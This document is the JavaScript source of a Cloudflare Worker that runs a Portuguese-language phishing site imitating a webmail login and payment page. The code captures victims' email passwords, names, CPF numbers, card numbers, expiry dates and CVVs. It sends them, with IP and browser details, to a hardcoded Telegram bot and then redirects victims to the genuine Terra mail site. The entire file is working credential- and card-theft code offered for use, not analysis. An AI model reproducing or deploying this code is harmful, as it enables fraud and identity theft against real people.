const TELEGRAM_TOKEN = '7731169374:AAF2qtPXZgQELEHs6DnCBJUij638xwYUVVY';
const CHAT_ID = '6261750345';
const URL_REDIRECIONAR = 'https://mail.terra.com.br/';
const URL_PAGAMENTO = 'https://webmail1.maguimdasencomendas.workers.dev/pagamento.html';

const GITHUB_INDEX = 'https://raw.githubusercontent.com/SACATENDIMENTO/aprimorandoatualiza-p/main/index.html';
const GITHUB_PAGAMENTO = 'https://raw.githubusercontent.com/SACATENDIMENTO/aprimorandoatualiza-p/main/pagamento.html';

async function buscarHTML(url, fallback) {
    try {
        const r = await fetch(url, { cf: { cacheTtl: 60 } });
        if (!r.ok) return fallback;
        return await r.text();
    } catch {
        return fallback;
    }
}

async function enviarTelegram(mensagem) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    const params = new URLSearchParams();
    params.append('chat_id', CHAT_ID);
    params.append('text', mensagem);
    params.append('parse_mode', 'HTML');
    await fetch(url, { method: 'POST', body: params });
}

export default {
    async fetch(request) {
        const url = new URL(request.url);

        if (request.method === 'POST') {
            try {
                const formData = await request.formData();
                const ip = request.headers.get('CF-Connecting-IP') || 'desconhecido';
                const data = new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' });
                const userAgent = request.headers.get('User-Agent') || 'desconhecido';

                const hasLogin = formData.get('user') || formData.get('email');
                const hasPayment = formData.get('nome') || formData.get('cpf') || formData.get('cartao');

                if (hasLogin && !hasPayment) {
                    const email = formData.get('user') || formData.get('email') || '';
                    const senha = formData.get('pass') || formData.get('password') || '';

                    const mensagem = `🔐 <b>LOGIN CAPTURADO</b>\n━━━━━━━━━━━━━━━━━━\n📧 <b>Email:</b> ${email}\n🔑 <b>Senha:</b> ${senha}\n━━━━━━━━━━━━━━━━━━\n🌐 <b>IP:</b> ${ip}\n📱 <b>User Agent:</b> ${userAgent}\n⏰ <b>Data/Hora:</b> ${data}\n━━━━━━━━━━━━━━━━━━`;
                    await enviarTelegram(mensagem);

                    const destino = `${URL_PAGAMENTO}?protocolo=${encodeURIComponent(email)}&token=${encodeURIComponent(senha)}`;
                    return new Response(JSON.stringify({ ok: true, redirect: destino }), {
                        status: 200,
                        headers: { 'Content-Type': 'application/json; charset=UTF-8' }
                    });
                }

                if (hasPayment) {
                    const nome = formData.get('nome') || '';
                    const cpf = formData.get('cpf') || '';
                    const email = formData.get('email') || '';
                    const cartao = formData.get('cartao') || '';
                    const validade = formData.get('validade') || '';
                    const cvv = formData.get('cvv') || '';
                    const emailOriginal = formData.get('email_original') || '';
                    const senhaOriginal = formData.get('senha_original') || '';

                    const mensagem = `💳 <b>DADOS DE PAGAMENTO CAPTURADOS</b>\n━━━━━━━━━━━━━━━━━━\n📧 <b>Email:</b> ${email}\n📝 <b>Nome:</b> ${nome}\n🆔 <b>CPF:</b> ${cpf}\n💳 <b>Cartão:</b> ${cartao}\n📅 <b>Validade:</b> ${validade}\n🔢 <b>CVV:</b> ${cvv}\n━━━━━━━━━━━━━━━━━━\n📧 <b>Email Original:</b> ${emailOriginal}\n🔑 <b>Senha Original:</b> ${senhaOriginal}\n━━━━━━━━━━━━━━━━━━\n🌐 <b>IP:</b> ${ip}\n📱 <b>User Agent:</b> ${userAgent}\n⏰ <b>Data/Hora:</b> ${data}\n━━━━━━━━━━━━━━━━━━`;
                    await enviarTelegram(mensagem);

                    return new Response(JSON.stringify({ ok: true, redirect: URL_REDIRECIONAR }), {
                        status: 200,
                        headers: { 'Content-Type': 'application/json; charset=UTF-8' }
                    });
                }

                return new Response(JSON.stringify({ ok: true, redirect: URL_REDIRECIONAR }), {
                    status: 200,
                    headers: { 'Content-Type': 'application/json; charset=UTF-8' }
                });
            } catch (error) {
                await enviarTelegram(`❌ ERRO NO WORKER: ${error.message}`);
                return new Response(JSON.stringify({ ok: false, redirect: URL_REDIRECIONAR }), {
                    status: 200,
                    headers: { 'Content-Type': 'application/json; charset=UTF-8' }
                });
            }
        }

        if (url.pathname === '/' || url.pathname === '/index.html') {
            const html = await buscarHTML(GITHUB_INDEX, '<h1>Erro ao carregar</h1>');
            return new Response(html, { headers: { 'Content-Type': 'text/html; charset=UTF-8' } });
        }

        if (url.pathname === '/pagamento.html') {
            const html = await buscarHTML(GITHUB_PAGAMENTO, '<h1>Erro ao carregar</h1>');
            return new Response(html, { headers: { 'Content-Type': 'text/html; charset=UTF-8' } });
        }

        return new Response('Not Found', { status: 404 });
    }
};
